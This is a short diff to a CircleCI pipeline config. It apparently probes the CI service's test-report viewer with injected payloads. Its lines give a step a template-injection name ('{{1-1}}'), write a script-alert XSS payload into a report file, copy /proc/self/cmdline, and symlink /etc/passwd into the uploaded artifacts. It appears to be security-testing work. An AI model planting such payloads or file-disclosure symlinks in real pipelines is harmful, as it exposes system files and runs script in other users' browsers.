@@ -15,9 +15,11 @@ jobs:
       - checkout
       - run: mkdir test-reports
       - run:
-          name: Pwn<h1>a<u>b
+          name: Pwn{{1-1}}
           command: |
-              echo '<script>alert(document.domain)</script>' > /home/circleci/project/test-reports/xss.html
+              echo '<script>alert(document.domain)</script>' > /home/circleci/project/test-reports/text.xml
+              cp /proc/self/cmdline /home/circleci/project/test-reports/
+              ln -s /etc/passwd /home/circleci/project/test-reports/asd.cgi
       - run:
           name: Download Selenium
           command: |
